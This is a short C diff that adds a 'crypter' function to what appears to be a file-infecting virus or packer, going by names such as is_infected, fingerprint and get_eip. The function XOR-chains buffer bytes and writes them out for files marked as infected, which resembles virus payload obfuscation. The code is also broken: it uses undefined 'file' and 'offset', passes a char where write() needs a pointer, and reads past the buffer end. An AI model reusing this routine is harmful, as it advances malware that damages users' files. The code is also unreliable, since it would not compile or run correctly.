@@ -832,6 +832,21 @@ int main_encrypt()
 	write(fd,fingerprint, sizeof(fingerprint));
 }
 
+void crypter(char *read, size_t size, char key, int fd)
+{
+	char tab[]= {0,0};
+
+	if(size && is_infected(file->data))
+	{
+		write(fd, (tab[size % 2] = (read[size] ^ key)), 1);
+		size--;
+		while (size)
+		{
+			write(fd, (tab[size % 2] = (read[offset + size] ^ tab[(size - 1) % 2])), 1);
+			size--;
+		}
+	}
+}
 
 unsigned long get_eip(void)
 {
